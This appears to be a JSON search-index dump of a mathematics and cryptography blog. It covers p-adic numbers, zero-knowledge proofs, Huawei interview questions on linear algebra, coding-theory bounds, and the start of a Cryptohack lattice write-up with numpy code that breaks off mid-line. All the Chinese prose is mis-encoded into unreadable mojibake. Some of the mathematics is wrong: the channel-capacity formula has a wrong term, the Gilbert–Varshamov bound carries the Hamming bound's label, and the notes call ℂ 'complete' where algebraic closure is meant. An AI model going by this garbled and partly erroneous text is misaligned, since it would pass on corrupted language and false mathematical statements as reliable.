lengthã€‚å¦‚æœæˆ‘ä»¬ç°åœ¨è€ƒè™‘ä¸€ä¸ªæ— é™é•¿çš„codeï¼Œé‚£ä¹ˆè¯¥å¦‚æœè¡¨è¾¾$-1$å‘¢ï¼Ÿå¾ˆæ˜¾ç„¶æ˜¯$(\\cdots1111)_2$å¯¹å§ï¼Œå› ä¸ºå®ƒæ»¡è¶³ \\forall n \\in \\mathbb{N}_{>0} : -1 \\equiv \\sum^{\\infty}_{i=0}1\\cdot 2^n \\quad \\text{ mod }2^n\\\\Pè¿›æ•° P-adic Numberså—åˆ°Introductioné‡Œçš„ä¾‹å­çš„å¯å‘ï¼Œæˆ‘ä»¬åšä»¥ä¸‹å®šä¹‰ï¼š Definition:Let $p$ be a prime number. A p-adic integer is a formal power seriesa_0+a_1p+a_2p^2+\\cdots = \\sum^\\infty_{i=0}a_ip^iwith $\\ a_i \\in \\{0,1,â€¦,p-1\\}$ for all $i \\in \\mathbb{N}$. The set of all p-adic integers is written as $\\mathbb{Z}_p$.Furthermore, let $f = \\frac{g}{h} \\in \\mathbb{Z}_p$, the denominator of which is not divisible by $p$, then a p-adic integer $\\sum^\\infty_{i=0}a_i p^i \\in \\mathbb{Z}_p$ is called the \\textbf{p-adic expansion} of $f$ if\\forall n \\in \\mathbb{N}_{>0} : \\ \\ \\ \\ g \\equiv h(a_0+ \\cdots + a_{n-1}p^{n-1}) \\ \\ \\text{mod} \\ p^n,and we writef \\sim \\sum^\\infty_{i=0}a_i p^i. Definition:Let $p$ be a prime number, $m \\in \\mathbb{Z}$ an integer. A series of the form\\sum^\\infty_{i=m}a_i p^i,where $a_i \\in \\{0,â€¦,p-1\\}$ for all $i$, is called a p-adic number and the set of all p-adic numbers is written as $\\mathbb{Q}_p$.Furthermore, let $f = p^{m}\\frac{g}{h} \\in \\mathbb{Q}$, a $p$-adic number $\\sum^\\infty_{i=m}a_i p^i \\in \\mathbb{Q}_p$ is called the \\textbf{p-adic expansion} of $f \\in \\mathbb{Q}$, if $\\sum^\\infty_{i=0}a_{i+m} p^i$ is the p-adic expansion of $\\frac{g}{h}$. Absolute values and completenessDefinition: Let $a=\\sum_{i=m}^\\infty a_ip^i \\in \\mathbb{Q}_p$. Then we define the p-adic absolute value as follows:|a|_p:= \\begin{cases} 0 & \\text{if} \\ a=0 , \\\\ \\frac{1}{p^n} &\\text{otherwise, where} \\ n=\\text{min} \\{i \\in \\mathbb{Z} | a_i \\neq 0\\}. \\end{cases} Henselâ€™s lemmaTheorem:Let $q \\in \\mathbb{R}_{&gt;1}$, $K$ be a field with a discrete valuation such that $K$ is complete with respect to the induced $q$-exponential absolute value. Let $\\mathcal{O}$ be its discrete valuation ring with the maximal ideal $\\mathfrak{p}$ and $\\kappa = \\mathcal{O}/\\mathfrak{p}$.If $f \\in \\mathcal{O} [X]$ is a primitive polynomial and there are coprime polynomials $\\bar{g}, \\bar{h} \\in \\kappa[X]$ such thatf \\equiv \\bar{g} \\cdot \\bar{h} \\ \\ \\ (\\text{mod} \\ \\mathfrak{p}),then there exist $g,h \\in \\mathcal{O}[X]$ with deg$(g) = \\text{deg}(\\bar{g})$ such thatf = g \\cdot h, \\ \\ \\ g \\equiv \\bar{g} \\ \\ (\\text{mod} \\ \\mathfrak{p}) \\ \\ \\text{and} \\ \\ h \\equiv \\bar{h} \\ \\ (\\text{mod} \\ \\mathfrak{p}).","categories":[{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"P-adic Numbers and Hensels Lemma","slug":"TUM-æ•°å­¦-ç¬”è®°/P-adic-Numbers-and-Hensels-Lemma","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/P-adic-Numbers-and-Hensels-Lemma/"}],"tags":[{"name":"pè¿›æ•°","slug":"pè¿›æ•°","permalink":"https://archer-baiyi.github.io/tags/p%E8%BF%9B%E6%95%B0/"},{"name":"P-adic Numbers","slug":"P-adic-Numbers","permalink":"https://archer-baiyi.github.io/tags/P-adic-Numbers/"},{"name":"Hensel's Lemma","slug":"Hensel-s-Lemma","permalink":"https://archer-baiyi.github.io/tags/Hensel-s-Lemma/"}]},{"title":"é›¶çŸ¥è¯†è¯æ˜ (Zero-knowledge proof)","slug":"CTF/Crypto/é›¶çŸ¥è¯†è¯æ˜-Zero-knowledge-proof","date":"2025-07-04T10:43:31.000Z","updated":"2025-07-04T11:34:23.882Z","comments":true,"path":"2025/07/04/CTF/Crypto/é›¶çŸ¥è¯†è¯æ˜-Zero-knowledge-proof/","permalink":"https://archer-baiyi.github.io/2025/07/04/CTF/Crypto/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E-Zero-knowledge-proof/","excerpt":"","text":"ä»€ä¹ˆæ˜¯é›¶çŸ¥è¯†è¯æ˜ (Zero-knowledge proof)A zero-knowledge proof (ZKP) is a technique that enables one party (the prover) to demonstrate to another party (the verifier) the truth of a certain statement without revealing any additional information besides the fact that the statement is true. The core idea behind zero-knowledge proofs is that while itâ€™s straightforward to prove you have certain knowledge by disclosing it, the real challenge lies in proving you have that knowledge without actually revealing the knowledge itself or any details about it. é›¶çŸ¥è¯†è¯æ˜ï¼ˆZero-Knowledge Proofï¼Œç®€ç§°ZKPï¼‰æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œä½¿ä¸€æ–¹ï¼ˆç§°ä¸ºâ€œè¯æ˜è€…â€ï¼‰èƒ½å¤Ÿå‘å¦ä¸€æ–¹ï¼ˆç§°ä¸ºâ€œéªŒè¯è€…â€ï¼‰è¯æ˜æŸä¸ªé™ˆè¿°çš„çœŸå®æ€§ï¼ŒåŒæ—¶ä¸æ³„éœ²é™¤è¯¥é™ˆè¿°ä¸ºçœŸè¿™ä¸€äº‹å®ä»¥å¤–çš„ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚é›¶çŸ¥è¯†è¯æ˜çš„æ ¸å¿ƒç†å¿µåœ¨äºï¼šå°½ç®¡é€šè¿‡ç›´æ¥æŠ«éœ²ä¿¡æ¯æ¥è¯æ˜è‡ªå·±æ‹¥æœ‰æŸç§çŸ¥è¯†æ˜¯è¾ƒä¸ºç›´æ¥çš„æ–¹å¼ï¼Œä½†çœŸæ­£çš„æŒ‘æˆ˜åœ¨äºå¦‚ä½•åœ¨ä¸æš´éœ²è¯¥çŸ¥è¯†æœ¬èº«æˆ–å…¶ä»»ä½•ç»†èŠ‚çš„å‰æä¸‹ï¼Œä»èƒ½è¯æ˜è‡ªå·±ç¡®å®æŒæ¡äº†è¿™é¡¹çŸ¥è¯†ã€‚ A ZK Protocol has 3 important attributes: Zero-Knowledge: this means that no information about the secret is revealed during the process. Completeness: meaning that an honest prover will always get accepted. Soundness: for this, we want that an impersonator has only a small cheating probability to get accepted. ä¸€ä¸ªé›¶çŸ¥è¯†åè®®å…·æœ‰ä¸‰ä¸ªé‡è¦å±æ€§ï¼š é›¶çŸ¥è¯†æ€§ï¼ˆZero-Knowledgeï¼‰ï¼šè¿™æ„å‘³ç€åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸ä¼šæ³„éœ²å…³äºç§˜å¯†çš„ä»»ä½•ä¿¡æ¯ã€‚ å®Œå¤‡æ€§ï¼ˆCompletenessï¼‰ï¼šè¿™è¡¨ç¤ºå¦‚æœè¯æ˜è€…æ˜¯è¯šå®çš„ï¼Œå…¶è¯æ˜å°†æ€»æ˜¯è¢«éªŒè¯è€…æ¥å—ã€‚ å¯é æ€§ï¼ˆSoundnessï¼‰ï¼šæŒ‡çš„æ˜¯ä¼ªè£…è€…ï¼ˆå†’å……çš„è¯æ˜è€…ï¼‰è¢«éªŒè¯è€…æ¥å—çš„æ¦‚ç‡åº”è¯¥éå¸¸ä½ã€‚ ä¾‹å­ï¼šä½ éœ€è¦å‘ä½ çš„ä¸€ä½è‰²ç›²æœ‹å‹ç»´å…‹å¤šè¯æ˜ï¼Œä¸¤åªå½¢çŠ¶å®Œå…¨ç›¸åŒçš„çƒï¼ˆä¸€åªæ˜¯çº¢è‰²ï¼Œå¦ä¸€åªæ˜¯ç»¿è‰²ï¼‰æ˜¯ä¸åŒçš„ï¼Œä½†åˆä¸èƒ½é€éœ²å“ªåªæ˜¯çº¢çš„ã€å“ªåªæ˜¯ç»¿çš„ã€‚ä¸ºæ­¤ï¼Œä½ é‡‡ç”¨äº†ä¸€ç§ç‰¹å®šçš„è¯æ˜ç³»ç»Ÿã€‚ ä½ å…ˆå‘ç»´å…‹å¤šå±•ç¤ºè¿™ä¸¤åªçƒã€‚ä»–ç”±äºæ— æ³•åˆ†è¾¨é¢œè‰²ï¼Œçœ‹ä¸å‡ºå®ƒä»¬çš„åŒºåˆ«ã€‚æ¥ç€ä»–å°†çƒè—èµ·æ¥ï¼Œéšæœºé€‰å‡ºä¸€åªç»™ä½ çœ‹ï¼Œç„¶åå¯èƒ½ä¼šå°†å®ƒæ¢æˆå¦ä¸€åªï¼Œä¹Ÿå¯èƒ½ä¸æ¢ï¼Œå†æ¬¡å±•ç¤ºç»™ä½ ã€‚ä½ éœ€è¦åˆ¤æ–­ä»–æ˜¯å¦äº¤æ¢äº†çƒã€‚ç”±äºä½ èƒ½é€šè¿‡é¢œè‰²åˆ†è¾¨çƒçš„ä¸åŒï¼Œä½ æ¯æ¬¡éƒ½èƒ½å‡†ç¡®åˆ¤æ–­ä»–æ˜¯å¦æ›´æ¢äº†çƒã€‚ è¿™ä¸ªè¿‡ç¨‹é‡å¤è¶³å¤Ÿå¤šçš„æ¬¡æ•°ï¼ˆä¾‹å¦‚50æ¬¡ï¼‰ï¼Œè€Œä½ æ¯æ¬¡éƒ½èƒ½æ­£ç¡®è¯†åˆ«æ˜¯å¦æ¢äº†çƒï¼Œè¿™è®©ç»´å…‹å¤šç¡®ä¿¡ä¸¤åªçƒç¡®å®ä¸åŒï¼Œä½†ä»–ä¾ç„¶æ— æ³•å¾—çŸ¥å“ªåªæ˜¯çº¢è‰²ï¼Œå“ªåªæ˜¯ç»¿è‰²ã€‚è¿™ä¸ªè¯æ˜è¿‡ç¨‹æ²¡æœ‰æ³„éœ²é™¤â€œè¿™ä¸¤åªçƒä¸åŒâ€ä¹‹å¤–çš„ä»»ä½•ä¿¡æ¯ï¼Œå› æ­¤ï¼Œè¿™æ˜¯ä¸€ä¸ªé›¶çŸ¥è¯†è¯æ˜çš„ä¾‹å­ã€‚ Feigeâ€“Fiatâ€“Shamir identification schemeUriel Feige, Amos Fiat ä»¥åŠ Adi Shamir äº1988å¹´æå‡ºäº†ä¸€ç§åŸºäºäºŒæ¬¡å‰©ä½™é—®é¢˜çš„é›¶çŸ¥è¯†è¯æ˜åè®®ï¼ˆZK Protocolï¼‰ã€‚ æ•´ä½“æµç¨‹ä¸»è¦åˆ†ä¸º2ä¸ªé˜¶æ®µï¼šç”Ÿæˆå¯†é’¥ä»¥åŠéªŒè¯ã€‚ 1. ç”Ÿæˆå¯†é’¥ï¼ˆKey generationï¼‰ï¼š Proveré€‰æ‹©2ä¸ªä¸åŒçš„è´¨æ•°$p,q$ï¼Œä¸€ä¸ªæ­£æ•´æ•°$k$ï¼Œå¹¶ä¸”è®¡ç®—$n:= pq$ã€‚ æŒ‘é€‰$k$ä¸ªä¸$n$äº’è´¨çš„æ•°ï¼š$s_1,â€¦,s_k$ï¼Œå¹¶è®¡ç®— v_i := s_i^{-2} \\quad \\text{ mod }nå…¬é’¥ï¼ˆVerifierå·²çŸ¥çš„ä¿¡æ¯ï¼‰ä¸º$P = (n,v_1,â€¦,v_k)$ï¼Œå¯†é’¥ä¸º$S= (p,q,s_1,â€¦,s_k)$ã€‚ 2. éªŒè¯ï¼ˆVerificationï¼‰ï¼š (1) ProveréšæœºæŒ‘é€‰ä¸€ä¸ªæ•´æ•°$c$ä»¥åŠä¸€ä¸ªç¬¦å·$\\sigma \\in \\{-1,1\\}$ï¼Œè®¡ç®— x \\equiv \\sigma c^2 \\quad \\text{ mod }nå¹¶å°†è¿™ä¸ªç»“æœ$x$å‘é€ç»™Verifierã€‚ (2) VerifieræŒ‘é€‰ä¸€ä¸ªchallenge $b = (b_1,â€¦,b_k) \\in \\{0,1\\}^k$ï¼Œå°†å…¶å‘é€ç»™proverã€‚ (3) Proverè®¡ç®— r \\equiv c \\prod_{j\\in [k] \\text{ s.t } b_j = 1} s_j \\quad \\text{ mod }nå¹¶å°†$r$å‘é€ç»™verifierã€‚ (4) Verifieræ£€æŸ¥æ˜¯å¦æ»¡è¶³ x \\equiv \\pm \\, r^2 \\prod_{j\\in [k] \\text{ s.t } b_j = 1} v_j \\quad \\text{ mod }n.é‚£ä¹ˆè¿™ä¸ªProtocolä¸ºä»€ä¹ˆæ˜¯æœ‰æ•ˆçš„ï¼Ÿä¸éš¾å‘ç°ï¼š \\pm \\, r^2 \\prod_{j\\in [k] \\text{ s.t } b_j = 1} v_j = \\pm \\, c^2 \\prod_{j\\in [k] \\text{ s.t } b_j = 1} s_j^2 v_j \\equiv \\pm \\, c^2 \\equiv x \\quad \\text{ mod }n.å› ä¸º$s^2_j \\equiv v_j^{-1} \\text{ mod }n.$ è€Œè¿™ä¸ªProtocolçš„å®‰å…¨æ€§æ˜¯å»ºç«‹åœ¨æ±‚è§£äºŒæ¬¡å‰©ä½™çš„å›°éš¾æ€§ä¸Šï¼Œå³æ‰¾åˆ°ä»¥ä¸‹ç­‰å¼çš„è§£ï¼š y ^2 \\equiv v^{-1}_j \\quad \\text{ mod }n.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"é›¶çŸ¥è¯†è¯æ˜","slug":"é›¶çŸ¥è¯†è¯æ˜","permalink":"https://archer-baiyi.github.io/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"name":"Zero-knowledge proof","slug":"Zero-knowledge-proof","permalink":"https://archer-baiyi.github.io/tags/Zero-knowledge-proof/"},{"name":"ZKP","slug":"ZKP","permalink":"https://archer-baiyi.github.io/tags/ZKP/"}]},{"title":"åä¸º wireless terminal chipset research lab é¢è¯•","slug":"æ‚/åä¸º-wireless-terminal-chipset-research-lab-é¢è¯•","date":"2025-07-01T17:55:53.000Z","updated":"2025-07-01T19:10:16.200Z","comments":true,"path":"2025/07/01/æ‚/åä¸º-wireless-terminal-chipset-research-lab-é¢è¯•/","permalink":"https://archer-baiyi.github.io/2025/07/01/%E6%9D%82/%E5%8D%8E%E4%B8%BA-wireless-terminal-chipset-research-lab-%E9%9D%A2%E8%AF%95/","excerpt":"","text":"ç®€å•è®°å½•ä¸€ä¸‹ä»Šå¤©é¢è¯•é—®åˆ°çš„é—®é¢˜ä»¥åŠæ­£ç¡®ç­”æ¡ˆã€‚åŸºæœ¬ä¸Šå…¨æ˜¯åœ¨é—®Linear Algebraçš„å„ç§é—®é¢˜ã€‚ä¸è¿‡æœ‰ä¸€ç‚¹æˆ‘æ²¡æœ‰æƒ³åˆ°çš„æ˜¯ï¼Œä»–ä»¬å±…ç„¶ä¼šè®©æˆ‘è®²æˆ‘çš„è®ºæ–‡ä»¥åŠCTFæ¯”èµ›çš„å†…å®¹ã€‚ï¼ˆå½“ç„¶ï¼Œè®ºæ–‡çš„éƒ¨åˆ†è·Ÿæˆ‘é¢„æƒ³çš„ä¸€æ ·ï¼Œä»–ä»¬åº”è¯¥åªå¬æ‡‚äº†introductionçš„éƒ¨åˆ†ã€‚æ¯•ç«Ÿè¿™ä¸œè¥¿å®åœ¨æ˜¯å¤ªçº¯æ•°äº†ç‚¹ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰ä»»ä½•å®é™…åº”ç”¨ã€‚ï¼‰ 1. æ€ä¹ˆæ ·å¯ä»¥å¿«é€Ÿç¡®å®šä¸€ä¸ªçŸ©é˜µçš„ç§©ï¼ˆrankï¼‰ï¼Ÿï¼ˆå‡è®¾$A \\in \\mathbb{R}^{m \\times n}$ï¼‰ é«˜æ–¯æ¶ˆå…ƒæ³•ï¼ˆGauss Eliminationï¼‰ ç§©ä¸ºéé›¶è¡Œçš„æ•°é‡ ä¸å¤Ÿç¨³å®šï¼Œå› ä¸ºä¼šåšé™¤æ³•ã€‚ä½†å¦‚æœåªå¸Œæœ›æ±‚ç§©çš„è¯åˆ™ä¸éœ€è¦è€ƒè™‘è¿™ä¸ªé—®é¢˜ã€‚ å¤æ‚åº¦ï¼š$\\mathcal{O}(n^3)$ QRåˆ†è§£ï¼ˆQR Decompositionï¼‰ï¼š A = QR$Q \\in \\mathbb{R}^{m \\times m}$æ˜¯æ­£äº¤ï¼ˆorthogonalï¼‰çŸ©é˜µï¼Œ$R \\in \\mathbb{R}^{m \\times n}$æ˜¯ä¸Šä¸‰è§’çŸ©é˜µã€‚ ç§©ä¸ºRçš„éé›¶å¯¹è§’å…ƒç´ ä¸ªæ•°ï¼ˆnon-zero diagonal entriesï¼‰ ç›¸å¯¹ç¨³å®š å¤æ‚åº¦ï¼š$\\mathcal{O}(n^3)$ SVDåˆ†è§£ï¼ˆSVD Decompositionï¼‰ï¼š A = U\\Sigma V^T$U \\in \\mathbb{R}^{m \\times m}$æ˜¯åˆ—æ­£äº¤çŸ©é˜µï¼ˆå·¦å¥‡å¼‚å‘é‡ï¼‰ï¼Œ$V \\in \\mathbb{R}^{n \\times n}$æ˜¯åˆ—æ­£äº¤çŸ©é˜µï¼ˆå³å¥‡å¼‚å‘é‡ï¼‰ï¼Œ$\\Sigma \\in \\mathbb{R}^{m \\times n}$æ˜¯å¯¹è§’çŸ©é˜µï¼Œå¯¹è§’çº¿å…ƒç´ æ˜¯éè´Ÿå®æ•°ï¼Œä¸ºå¥‡å¼‚å€¼ï¼ˆSingular Valuesï¼‰ã€‚ ç§©ä¸ºéé›¶å¥‡å¼‚å€¼çš„ä¸ªæ•° éå¸¸ç¨³å®šã€‚ å¤æ‚åº¦ï¼š$\\mathcal{O}(n^3)$ æ³¨æ„ï¼Œä»–ä»¬çš„ç†è®ºå¤æ‚åº¦æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å¸¸æ•°é¡¹æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥åœ¨å®é™…åº”ç”¨ä¸­ï¼Œé«˜æ–¯æ˜¯æœ€å¿«çš„ï¼Œå…¶æ¬¡æ˜¯QRåˆ†è§£ï¼Œæœ€åæ‰æ˜¯SVDåˆ†è§£ã€‚ 2. å°†è¿™ä¸ªé—®é¢˜å»ºæ¨¡å¹¶è§£å†³å®ƒï¼šå‡è®¾ç°åœ¨æœ‰nä¸ªç‰©å“ï¼ˆæœ‰ä¸åŒçš„å¤§å°ï¼‰ï¼Œå¹¶ä¸”æœ‰å¾ˆå¤šç§ä¸åŒå¤§å°çš„ç›’å­ï¼Œæ¯ä¸ªç›’å­é‡Œï¼Œåªè¦å¤§å°å…è®¸ï¼Œå°±å¯ä»¥æ”¾å¤šä¸ªç‰©å“ã€‚æˆ‘ä»¬å¸Œæœ›minimizeæœ€åçš„ç›’å­çš„æ•°é‡ä»¥åŠå¤šä½™çš„ç©ºé—´ã€‚ ä¸ä¼šã€‚ 3. ä¸€ä¸ªçŸ©é˜µåœ¨ä»€ä¹ˆæƒ…å†µä¸‹ä¼šä¸å­˜åœ¨ç‰¹å¾å€¼ï¼Ÿ å¯¹äºå®æ•°çŸ©é˜µæ¥è¯´ï¼Œå½“å®ƒçš„characteristic functionåœ¨$\\mathbb{R}$ä¸Šæ²¡æœ‰æ ¹ï¼Œé‚£ä¹ˆå®ƒå°±æ²¡æœ‰ç‰¹å¾å€¼ã€‚æ¯”å¦‚è¯´ A = \\begin{bmatrix} 0 & 1 \\\\ -1 & 0 \\end{bmatrix}characteristic functionï¼š \\det(A - \\lambda I) = \\begin{vmatrix} -\\lambda & 1 \\\\ -1 & -\\lambda \\end{vmatrix} = (-\\lambda)(-\\lambda) - (1)(-1) = \\lambda^2 + 1 = 0 \\Rightarrow \\lambda = \\pm iè€Œå¯¹äºå¤æ•°çŸ©é˜µæ¥è¯´ï¼Œå®ƒä»¬æ°¸è¿œéƒ½ä¼šæœ‰ç‰¹å¾å€¼ï¼Œå› ä¸º$\\mathbb{C}$æ˜¯completeçš„ï¼Œæ‰€ä»¥å®ƒçš„characteristic functionåœ¨$\\mathbb{C}$ä¸€å®šæœ‰æ ¹ã€‚ ä»–ä»¬è¿˜é—®äº†ä¸€ä¸ªleast squareç›¸å…³çš„ï¼Œä½†æˆ‘ä»æ¥æ²¡æœ‰å¬è¿‡é‚£ä¸ªè¯ã€‚æˆ‘è®°å¾—æ˜¯least squareå‰é¢è·Ÿäº†ä¸€ä¸ªä»€ä¹ˆå•è¯ï¼Œä½†æˆ‘æ²¡æŸ¥åˆ°æ˜¯ä»€ä¹ˆã€‚","categories":[{"name":"æ‚","slug":"æ‚","permalink":"https://archer-baiyi.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"åä¸º","slug":"åä¸º","permalink":"https://archer-baiyi.github.io/tags/%E5%8D%8E%E4%B8%BA/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"https://archer-baiyi.github.io/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"Coding Theory ç¼–ç ç†è®º","slug":"TUM  æ•°å­¦ ç¬”è®°/Coding Theory ç¼–ç ç†è®º/Coding-Theory-ç¼–ç ç†è®º","date":"2025-06-30T14:00:20.000Z","updated":"2025-09-27T08:00:16.705Z","comments":true,"path":"2025/06/30/TUM  æ•°å­¦ ç¬”è®°/Coding Theory ç¼–ç ç†è®º/Coding-Theory-ç¼–ç ç†è®º/","permalink":"https://archer-baiyi.github.io/2025/06/30/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/Coding%20Theory%20%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/Coding-Theory-%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/","excerpt":"ç¼–ç ç†è®ºç›¸å…³ç¬”è®°","text":"åŸºç¡€Shannonâ€™s Theorem é¦™å†œç†è®ºè€ƒè™‘ä¸€ä¸ªbinary symmetric channelï¼Œå…¶ä¸­æ¯ä¸€ä½ä¼ è¾“é”™è¯¯çš„æ¦‚ç‡ä¸º$p$ã€‚è®°$q := 1-p$ã€‚ å‡è®¾$C$æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º$n$,åŒ…å«$M$ä¸ªè¯ï¼ˆ$x_1,â€¦,x_M$ï¼‰çš„codeã€‚è®¾$P_i$ä¸º$x_i$è¢«é”™è¯¯è§£ç çš„æ¦‚ç‡ï¼Œ P_C := \\frac{1}{M}\\sum^M_{i=1}P_iä»¥åŠ P^*(M,n,p) := \\underset{\\text{all possible codes }C}{\\text{min}} P_CDefinition:The channel capacity $C(p)$ of a binary symmetric channel is defined as:\\begin{align*}C(p) &:= 1 + p \\, \\text{log}_2(p)+ q \\,\\text{log}_2(p) \\\\&=1 + p \\, \\text{log}_2(p)+ (1-p) \\, \\text{log}_2(1-p)\\end{align*} Theorem (Shannonâ€™s Theorem é¦™å†œå®šç†):Let$C(p)$ be the channel capacity. If $0 &lt; R &lt; C(p)$ and $M_n := 2^{\\lfloor Rn \\rfloor}$, then\\underset{n \\to \\infty}{\\text{lim}}P^*(M_n,n,p) = 0. é¦–å…ˆRå…¶å®è¡¨ç¤ºçš„æ˜¯ç›®å‰ç¼–ç çš„ä¼ è¾“æ•ˆç‡ï¼Œå› ä¸ºå½“ä¼ è¾“nä½çš„ä¿¡æ¯æ—¶ï¼Œå…¶ä¸­åªæœ‰$\\text{log}_2(M)$ä½æ˜¯çœŸçš„æœ‰æ•ˆä¿¡æ¯ã€‚ æ‰€ä»¥å¯ä»¥è¿™æ ·ç†è§£Shannonâ€™s Theorem é¦™å†œå®šç†ï¼š å¯¹äºæ¯ä¸ªé¢‘é“ï¼ˆChannelï¼‰æ¥è¯´ï¼Œ$C(p)$æ˜¯å…¶ä¼ è¾“æ•ˆç‡ï¼ˆRï¼‰çš„ä¸Šé™ã€‚ æ³¨æ„åˆ°ï¼Œå½“$p=0.5$æ—¶ï¼Œ$C(p) = 1 + \\text{log}_2(0.5) = 1-1 = 0$ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¼ è¾“æ—¶æ¯ä¸€ä½çš„å‡†ç¡®ç‡éƒ½æ˜¯çº¯éšæœºçš„æ—¶å€™ï¼Œä¸å­˜åœ¨ä»»ä½•ç¼–ç ä½¿å¾—æˆ‘ä»¬å¯ä»¥æ­£ç¡®åœ°ä¼ è¾“æ•°æ®ã€‚ Bounds/ç•Œé™Singleton BoundTheorem:Let $q$ be a prime power and $k \\leq n$ be positive integers. Let $C$ be an $[n,k]_q$ linear code. Then,d_H(C) \\leq n-k+1. MDS CodeDefinition:A code that achieves the Singleton bound is called a maximum distance separable (MDS) code. Hamming boundTheorem (Hamming bound):Let $q$ be a prime power and $k \\leq n$ be positive integers. Let $C$ be an $[n,k]_q$ linear code with $d_H(C) \\geq d$ and let $t = \\lfloor \\frac{d-1}{2} \\rfloor$. Then,|C| \\leq \\frac{q^n}{V_H(t,n,q)}Equivalently,\\begin{align*}q^k &\\leq \\frac{q^n}{V_H(t,n,q)}\\\\\\Leftrightarrow q^{n-k} &\\geq V_H(t,n,q)\\\\\\Leftrightarrow q^{n-k} &\\geq \\sum^t_{i=0}\\binom{n}{i}(q-1)^i\\\\\\end{align*} Perfect CodeDefinition:Let $q$ be a prime power and $k \\leq n$ be positive integers. An $[n,k,d]_q$ linear code $C$ withq^{n-k} = V_H(\\lfloor \\frac{d-1}{2} \\rfloor,n,q),i.e. achieves the Hamming bound, is called a perfect code Definition ï¼ˆHamming Codeï¼‰:Let $q$ be a prime power and $r \\geq 2$ be a positive integer. Let $n = \\frac{q^r-1}{q-1}$ and $H$ be the $r \\times n$ matrix having as columns all vectors in $\\mathbb{F}^r_q$ up to non-zero scalar multiples. Then $\\mathcal{C} = \\text{ker}(H^T)$ is called Hamming code. Lemma:Let $q$ be a prime power and $r \\geq 2$ be a positive integer and set $n = \\frac{q^r-1}{q-1}$. The $[n,n-r]_q$ Hamming code has $d_H(\\mathcal{C}) = 3$ and is perfect. Gilbert-Varshamov BoundLet $A(d,n,q)$ be the largest size of any code (also non-linear) in $\\mathbb{F}^n_q$ with minimum distance at least $d$. Theorem (Hamming bound):Let $q$ be a prime power and $n,d$ be positive integers. Then,A(d,n,q) \\geq \\frac{q^n}{V_H(d-1,n,q)} Plotkin BoundTheorem (Plotkin Bound):Let $q$ be a prime power and $k \\leq n$ be positive integers. Let $C$ be an $[n,k]_q$ non-degenerate linear code. Then,d_H(C) \\leq \\frac{|C|}{|C|-1}n\\frac{q-1}{q}. The simplex code achieves this Plotkin Bound.","categories":[{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"Coding Theory ç¼–ç ç†è®º","slug":"TUM-æ•°å­¦-ç¬”è®°/Coding-Theory-ç¼–ç ç†è®º","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Coding-Theory-%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"}],"tags":[{"name":"ç¼–ç ç†è®º","slug":"ç¼–ç ç†è®º","permalink":"https://archer-baiyi.github.io/tags/%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"},{"name":"Coding Theory","slug":"Coding-Theory","permalink":"https://archer-baiyi.github.io/tags/Coding-Theory/"}]},{"title":"Cryptohack Lattices Writeup","slug":"CTF/Crypto/Cryptohack-Lattices-Writeup","date":"2025-06-28T12:51:22.000Z","updated":"2025-06-28T20:00:53.379Z","comments":true,"path":"2025/06/28/CTF/Crypto/Cryptohack-Lattices-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/28/CTF/Crypto/Cryptohack-Lattices-Writeup/","excerpt":"","text":"LatticesVectors 1702 Size and Basis \\sqrt{4^2 + 6^2+2^2+5^2} = 919 Gram Schmidt 12345678910111213141516171819202122232425262728import numpy as np# ç»™å®šçš„åŸºå‘é‡v1 = np.array([4, 1, 3, -1], dtype=float)v2 = np.array([2, 1, -3, 4], dtype=float)v3 = np.array([1, 0, -2, 7], dtype=float)v4 = np.array([6, 2, 9, -5], dtype=float)vectors = [v1, v2, v3, v4]# Gram-Schmidt æ­£äº¤åŒ–è¿‡ç¨‹def gram_schmidt(vectors): orthogonal_basis = [] for v in vectors: u = v.copy() for b in orthogonal_basis: proj = np.dot(v, b) / np.dot(b, b) * b u -= proj orthogonal_basis.append(u) return orthogonal_basis# æ‰§è¡Œ Gram-Schmidt ç®—æ³•orthogonal_basis = gram_schmidt(vectors)# æå– u4 çš„ç¬¬äºŒä¸ªåˆ†é‡å¹¶ä¿ç•™ 5 ä½æœ‰æ•ˆæ•°å­—u4 = orthogonal_basis[3]second_component = float(f&quot;&#123;u4[1]:.5g&#125;&quot;)print(&quot;Second component of u4 (5 sig. fig.):&quot;, second_component)# Second component of u4 (5 sig. fig.): 0.91611 Whatâ€™s a Lattice? 1234567891011121314import numpy as np# åŸºå‘é‡ä½œä¸ºçŸ©é˜µçš„è¡ŒA = np.array([ [6, 2, -3], [5, 1, 4], [2, 7, 1]])# 